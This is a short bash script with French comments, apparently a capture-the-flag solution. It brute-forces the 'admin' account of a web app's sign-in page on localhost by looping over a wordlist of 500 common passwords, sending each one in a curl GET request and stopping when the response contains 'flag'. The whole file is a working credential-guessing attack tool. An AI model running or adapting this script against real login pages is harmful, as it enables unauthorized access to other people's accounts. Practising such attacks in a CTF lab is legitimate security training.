#!/bin/bash

# URL de la page de connexion
URL="http://localhost:8080/?page=signin"

# Nom d'utilisateur
USERNAME="admin"

# Fichier contenant les mots de passe à tester
PASSWORD_FILE="500-worst-passwords.txt"

# Lecture du fichier ligne par ligne
while IFS= read -r PASSWORD; do
    echo "🔑 Tentative avec le mot de passe : $PASSWORD"

    # Utilisation de curl pour simuler la connexion
    RESPONSE=$(curl -s "${URL}&username=${USERNAME}&password=${PASSWORD}&Login=Login#")

    # Vérifier si le mot "flag" est présent dans la réponse (signifiant que l'authentification a réussi)
    if echo "$RESPONSE" | grep -iq "flag"; then
        echo "🎉 FLAG TROUVÉ ! Le mot de passe est : $PASSWORD"
        exit 0
    fi
done < "$PASSWORD_FILE"

# Si aucun mot de passe valide n'a été trouvé
echo "❌ Aucun mot de passe trouvé dans le fichier."

